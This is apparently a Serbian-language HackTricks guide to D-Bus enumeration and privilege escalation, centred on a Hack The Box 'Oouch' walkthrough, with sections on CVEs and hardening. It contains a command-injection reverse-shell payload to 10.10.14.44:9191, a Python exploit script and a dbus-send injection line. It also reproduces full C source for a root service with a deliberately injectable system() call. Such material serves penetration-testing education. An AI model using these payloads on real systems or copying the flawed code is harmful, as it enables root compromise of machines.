# Enumeracija D-Bus-a i eskalacija privilegija putem ubacivanja komandi

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeracija**

D-Bus se koristi kao posrednik za međuprocesnu komunikaciju (IPC) u Ubuntu desktop okruženjima. Na Ubuntu-u se istovremeno koristi nekoliko message bus-ova: system bus, koji prvenstveno koriste **privileged services za izlaganje servisa relevantnih za ceo sistem**, i session bus za svakog prijavljenog korisnika, koji izlaže servise relevantne samo za tog korisnika. Ovde je fokus prvenstveno na system bus-u zbog njegove povezanosti sa servisima koji se izvršavaju sa višim privilegijama (npr. root), pošto je naš cilj eskalacija privilegija. Arhitektura D-Bus-a koristi po jedan „router“ za svaki session bus, koji preusmerava poruke klijenata odgovarajućim servisima na osnovu adrese koju klijenti navedu za servis sa kojim žele da komuniciraju.<sup>[[1]](#references)</sup>

Servisi na D-Bus-u definisani su pomoću **objekata** i **interfejsa** koje izlažu. Objekti se mogu uporediti sa instancama klasa u standardnim OOP jezicima, pri čemu je svaka instanca jedinstveno identifikovana pomoću **putanje objekta**. Ova putanja, slično putanji u filesystem-u, jedinstveno identifikuje svaki objekat koji servis izlaže. Jedan od ključnih interfejsa za potrebe istraživanja jeste interfejs **org.freedesktop.DBus.Introspectable**, koji sadrži jednu metodu, Introspect. Ova metoda vraća XML reprezentaciju metoda, signala i svojstava koje objekat podržava; ovde je fokus na metodama, dok se svojstva i signali izostavljaju.

Za komunikaciju sa D-Bus interfejsom korišćena su dva alata: CLI alat pod nazivom **gdbus**, za jednostavno pozivanje metoda koje D-Bus izlaže u skriptama, i [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), GUI alat zasnovan na Python-u, namenjen enumeraciji servisa dostupnih na svakom bus-u i prikazivanju objekata sadržanih u svakom servisu.
```bash
sudo apt-get install d-feet
```
Ako proveravate **session bus**, prvo potvrdite trenutnu adresu:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Na prvoj slici prikazane su usluge registrovane na D-Bus system bus-u, pri čemu je **org.debin.apt** posebno istaknut nakon izbora dugmeta System Bus. D-Feet šalje upite ovoj usluzi za objekte i prikazuje interfejse, metode, svojstva i signale za izabrane objekte, što se vidi na drugoj slici. Potpis svake metode je takođe detaljno prikazan.

Značajna funkcija je prikaz **ID-a procesa (pid)** usluge i **command line-a**, što je korisno za potvrdu da li se usluga izvršava sa povišenim privilegijama, što je važno za relevantnost istraživanja.

**D-Feet takođe omogućava pozivanje metoda**: korisnici mogu uneti Python izraze kao parametre, koje D-Feet pretvara u D-Bus tipove pre prosleđivanja usluzi.

Međutim, imajte na umu da **neke metode zahtevaju authentication** pre nego što nam dozvole da ih pozovemo. Ignorisaćemo ove metode, jer je naš cilj da podignemo svoje privilegije bez credentials već na prvom mestu.

Takođe imajte na umu da neke usluge šalju upite drugoj D-Bus usluzi pod nazivom org.freedeskto.PolicyKit1 da bi utvrdile da li korisniku treba dozvoliti izvršavanje određenih radnji ili ne.

## **Enumeracija komandne linije**

### Izlistavanje objekata servisa

Moguće je izlistati otvorene D-Bus interfejse pomoću:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Servisi označeni kao **`(activatable)`** posebno su interesantni jer **još nisu pokrenuti**, ali ih bus request može pokrenuti na zahtev. Nemojte se zaustaviti na `busctl list`; povežite ta imena sa stvarnim binarnim datotekama koje bi izvršili.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
To vam brzo govori koja će `Exec=` putanja biti pokrenuta za aktivatable name i pod kojim identitetom. Ako su binarna datoteka ili njen execution chain slabo zaštićeni, neaktivni servis i dalje može postati putanja za privilege escalation.

#### Connections

[Sa Wikipedije:](https://en.wikipedia.org/wiki/D-Bus) Kada proces uspostavi konekciju sa bus-om, bus toj konekciji dodeljuje posebno bus ime pod nazivom _unique connection name_. Bus imena ovog tipa su nepromenljiva — garantovano je da se neće promeniti dok god konekcija postoji — i, što je još važnije, ne mogu se ponovo koristiti tokom životnog veka bus-a. To znači da nijedna druga konekcija sa tim bus-om nikada neće dobiti tako jedinstveno ime konekcije, čak i ako isti proces zatvori konekciju sa bus-om i kreira novu. Unique connection names se lako prepoznaju jer počinju znakom dvotačke, koji je inače nedozvoljen.<sup>[[4]](#references)</sup>

### Informacije o servisnom objektu

Zatim možete dobiti određene informacije o interfejsu pomoću:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Takođe povežite naziv bus-a sa njegovom `systemd` jedinicom i putanjom do izvršne datoteke:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Ovo odgovara na operativno pitanje koje je važno tokom privesc-a: **ako poziv metode uspe, koji će stvarni binary i unit izvršiti radnju?**

### Izlistavanje interfejsa servisnog objekta

Potrebno je da imate dovoljno dozvola.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspekcija interfejsa servisnog objekta

Imajte na umu da je u ovom primeru izabran najnoviji otkriveni interfejs pomoću parametra `tree` (_pogledajte prethodni odeljak_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Obratite pažnju na metodu `.Block` interfejsa `htb.oouch.Block` (onu koja nas zanima). Slovo „s“ u drugim kolonama može značiti da se očekuje string.

Pre nego što pokušate nešto opasno, prvo proverite metodu **read-oriented** ili na drugi način niskorizičnu metodu. Tako se jasno razdvajaju tri slučaja: pogrešna sintaksa, metoda je dostupna, ali je pristup odbijen, ili je metoda dostupna i pristup je dozvoljen.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Korelacija D-Bus metoda sa policies i actions

Introspection vam govori **šta** možete da pozovete, ali ne govori **zašto** je poziv dozvoljen ili odbijen. Za stvarni privesc triage obično je potrebno zajedno pregledati **tri sloja**:

1. **Activation metadata** (`.service` fajlovi ili `SystemdService=`) da biste saznali koji će se binary i unit zapravo pokrenuti.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) da biste saznali ko može da `own`, `send_destination` ili `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) da biste saznali podrazumevani authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Korisne komande:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Nemojte pretpostavljati mapiranje 1:1 između D-Bus metode i Polkit akcije. Ista metoda može izabrati drugu akciju u zavisnosti od objekta koji se menja ili konteksta tokom izvršavanja. Zato je praktičan tok rada:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` i pretraga relevantnih `.policy` fajlova
3. live probe niskog rizika pomoću `busctl call`, `gdbus call` ili `dbusmap --enable-probes --null-agent`

Proxy ili compatibility servisi zaslužuju dodatnu pažnju. **Proxy koji radi kao root** i prosleđuje zahteve drugom D-Bus servisu preko sopstvene unapred uspostavljene konekcije može nenamerno dovesti do toga da backend svaki zahtev tretira kao da dolazi od UID 0, osim ako se identitet izvornog pozivaoca ponovo ne proverava.<sup>[[3]](#references)</sup>

### Interfejs za nadgledanje/zarobljavanje

Uz dovoljno privilegija (same `send_destination` i `receive_sender` privilegije nisu dovoljne) možete **nadgledati D-Bus komunikaciju**.

Da biste **nadgledali** **komunikaciju**, morate biti **root**. Ako i dalje nailazite na probleme kao root, proverite [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) i [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Ako znate kako da konfigurišete D-Bus config fajl tako da **non-root korisnicima dozvoli njuškanje** komunikacije, molim vas **kontaktirajte me**!

Različiti načini za nadgledanje:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
U sledećem primeru interfejs `htb.oouch.Block` se nadgleda i **poruka "**_**lalalalal**_**" se šalje zbog pogrešne komunikacije**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Možete koristiti `capture` umesto `monitor` da biste sačuvali rezultate u datoteci **pcapng** koju Wireshark može da otvori:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Filtriranje sve buke <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Ako na busu ima previše informacija, prosledite match rule ovako:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Može se navesti više pravila. Ako poruka odgovara _bilo kom_ od pravila, poruka će biti prikazana. Ovako:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Pogledajte [D-Bus dokumentaciju](http://dbus.freedesktop.org/doc/dbus-specification.html) za više informacija o sintaksi match rule-a.<sup>[[7]](#references)</sup>

### Više

`busctl` ima još više opcija, [**pronađite ih sve ovde**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Ranjivi scenario**

Kao korisnik **qtc unutar hosta „oouch“ sa HTB-a**, možete pronaći **neočekivani D-Bus config fajl** koji se nalazi na putanji _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Iz prethodne konfiguracije znamo da **morate biti korisnik `root` ili `www-data` da biste slali i primali informacije** putem ove D-BUS komunikacije.

Kao korisnik **qtc** unutar docker kontejnera **aeb4525789d8**, možete pronaći kod povezan sa dbus-om u datoteci _/code/oouch/routes.py._ Ovo je relevantan kod:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Kao što možete videti, on se **povezuje sa D-Bus interfejsom** i funkciji **„Block“** šalje vrednost „client_ip“.

Sa druge strane D-Bus veze nalazi se neki kompajlirani binarni fajl napisan u jeziku C. Ovaj kod **osluškuje** D-Bus vezu **u potrazi za IP adresom i poziva iptables putem funkcije `system`** kako bi blokirao datu IP adresu.\
**Poziv funkcije `system` je namerno ranjiv na command injection**, pa će payload poput sledećeg kreirati reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Na kraju ove stranice možete pronaći **kompletan C kod D-Bus aplikacije**. U njemu, između linija 91–97, možete videti **kako su registrovani `D-Bus object path`** i **`interface name`**. Ove informacije će biti neophodne za slanje podataka D-Bus vezi:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Takođe, u redu 57 možete videti da je **jedini registrovani metod** za ovu D-Bus komunikaciju nazvan `Block`(_**Zato će u sledećem odeljku payloads biti poslati objektu usluge `htb.oouch.Block`, interfejsu `/htb/oouch/Block` i metodu `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Sledeći python kod će poslati payload D-Bus konekciji ka metodi `Block` putem `block_iface.Block(runme)` (_imajte na umu da je izdvojen iz prethodnog dela koda_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl and dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` je alat koji se koristi za slanje poruka u „Message Bus“
- Message Bus – softver koji sistemi koriste kako bi olakšali komunikaciju između aplikacija. Povezan je sa Message Queue (poruke se redom postavljaju u niz), ali se u Message Bus poruke šalju po subscription modelu i to veoma brzo.
- oznaka „-system“ koristi se za označavanje da je to system message, a ne session message (podrazumevano).
- oznaka „–print-reply“ koristi se za pravilno ispisivanje naše poruke i prijem odgovora u formatu čitljivom čoveku.
- „–dest=Dbus-Interface-Block“ je adresa Dbus interface-a.
- „–string:“ – tip poruke koju želimo da pošaljemo interface-u. Postoji nekoliko formata za slanje poruka, kao što su double, bytes, booleans, int i objpath. Od ovih formata, „object path“ je koristan kada želimo da pošaljemo putanju do fajla Dbus interface-u. U ovom slučaju možemo koristiti poseban fajl (FIFO) kako bismo prosledili command interface-u u obliku imena fajla. „string:;“ – koristi se za ponovno pozivanje object path-a, gde postavljamo FIFO reverse shell fajl/command.

_Napomena: u `htb.oouch.Block.Block`, prvi deo (`htb.oouch.Block`) upućuje na service object, a poslednji deo (`.Block`) upućuje na naziv method-a._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Pomoćni alati za automatizovanu enumeraciju (2023-2025)

Ručno enumerisanje velike D-Bus attack surface pomoću alata `busctl`/`gdbus` brzo postaje naporno. Dva mala FOSS uslužna programa objavljena poslednjih nekoliko godina mogu ubrzati rad tokom red-team ili CTF angažmana:

### dbusmap ("Nmap for D-Bus")
* Autor: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Napisan u jeziku C; jedna statička binarna datoteka (<50 kB) koja prolazi kroz svaku putanju objekta, preuzima `Introspect` XML i mapira je na PID/UID vlasnika.<sup>[[5]](#references)</sup>
* Korisne opcije:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Alat označava nezaštićena well-known imena znakom `!`, odmah otkrivajući servise koje možete *preuzeti* (take over) ili pozive metoda kojima se može pristupiti iz neprivilegovanog shell-a.

### uptux.py
* Autor: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Python-only skripta koja traži *writable* putanje u systemd jedinicama **i** previše permisivne D-Bus policy datoteke (npr. `send_destination="*"`).<sup>[[6]](#references)</sup>
* Brza upotreba:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus modul pretražuje navedene direktorijume i ističe svaki servis koji normalan korisnik može da spoofuje ili hijack-uje:
* `/etc/dbus-1/system.d/` i `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Značajne D-Bus greške za eskalaciju privilegija (2024-2025)

Praćenje nedavno objavljenih CVE-ova pomaže u uočavanju sličnih nesigurnih obrazaca u prilagođenom kodu. Dva dobra novija primera su:<sup>[[2]](#references)[[3]](#references)</sup>

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Servis koji radi kao root izložio je D-Bus interfejs koji su neprivilegovani korisnici mogli da rekonfigurišu, uključujući učitavanje macro ponašanja pod kontrolom napadača. | Ako daemon izlaže **upravljanje uređajem/profilom/konfiguracijom** na system bus-u, tretirajte writable konfiguraciju i macro funkcije kao primitive za izvršavanje koda, a ne samo kao "podešavanja". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Kompatibilni proxy koji radi kao root prosleđivao je zahteve backend servisima bez očuvanja bezbednosnog konteksta prvobitnog pozivaoca, pa su backend servisi verovali proxy-ju kao UID 0. | Tretirajte **proxy / bridge / compatibility** D-Bus servise kao zasebnu klasu grešaka: ako prosleđuju privilegovane pozive, proverite kako UID pozivaoca/Polkit kontekst dospeva do backend-a. |

Obratite pažnju na sledeće obrasce:
1. Servis radi **kao root na system bus-u**.
2. Ili **ne postoji provera autorizacije**, ili se provera vrši nad **pogrešnim subjektom**.
3. Dostupna metoda na kraju menja stanje sistema: instalacija paketa, izmene korisnika/grupa, konfiguracija bootloader-a, ažuriranje profila uređaja, upis u datoteke ili direktno izvršavanje komandi.

Koristite `dbusmap --enable-probes` ili ručni `busctl call` da potvrdite da li je metoda dostupna, a zatim pregledajte policy XML servisa i Polkit akcije da biste razumeli **koji subjekt** je zapravo autorizovan.

---

## Brze mere za hardening i detekciju

* Pretražite policy-je koji su world-writable ili otvoreni za *send/receive*:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Zahtevajte Polkit za opasne metode – čak i *root* proxy-ji treba da proslede PID *pozivaoca* funkciji `polkit_authority_check_authorization_sync()`, umesto sopstvenog PID-a.
* Oduzmite privilegije dugotrajno aktivnim pomoćnim procesima (koristite `sd_pid_get_owner_uid()` za promenu namespace-a nakon povezivanja na bus).
* Ako ne možete da uklonite servis, barem ga *ograničite* na namensku Unix grupu i restriktujte pristup u njegovoj XML policy datoteci.
* Blue-team: snimite system bus pomoću `busctl capture > /var/log/dbus_$(date +%F).pcapng` i uvezite snimak u Wireshark radi detekcije anomalija.

---

## References

- [1] [USBCreator D-Bus eskalacija privilegija u Ubuntu Desktop-u](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus servis dozvoljava konfiguraciju svakom neprivilegovanom korisniku](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Zaobilaženje autentifikacije u Deepin D-Bus Proxy servisu (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus dokumentacija](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
